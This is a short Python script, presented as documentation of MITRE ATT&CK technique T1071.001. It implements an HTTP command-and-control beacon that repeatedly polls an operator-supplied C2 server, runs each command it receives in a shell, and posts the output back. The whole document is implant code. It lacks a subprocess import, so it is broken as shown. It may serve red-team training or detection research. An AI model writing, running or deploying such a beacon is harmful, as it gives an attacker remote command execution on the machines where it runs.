# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1071.001: Application Layer Protocol: Web Protocols (HTTP)
# Objective: Using HTTP/HTTPS for C2 communication.

#!/usr/bin/env python3
import requests
import time
import argparse

def http_c2_loop(c2_server, beacon_interval=10):
    while True:
        try:
            response = requests.get(f"{c2_server}/beacon")
            if response.status_code == 200:
                command = response.text
                if command:
                    print(f"[+] Received command: {command}")
                    # Execute command (example: run via subprocess)
                    result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
                    requests.post(f"{c2_server}/result", data={"output": result})
            else:
                print(f"[-] Beacon failed. Status: {response.status_code}")
        except Exception as e:
            print(f"[-] Error: {e}")
        time.sleep(beacon_interval)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="T1071.001: HTTP C2 Beacon")
    parser.add_argument("--c2", required=True, help="C2 server URL")
    parser.add_argument("--interval", type=int, default=10, help="Beacon interval (seconds)")
    args = parser.parse_args()
    http_c2_loop(args.c2, args.interval)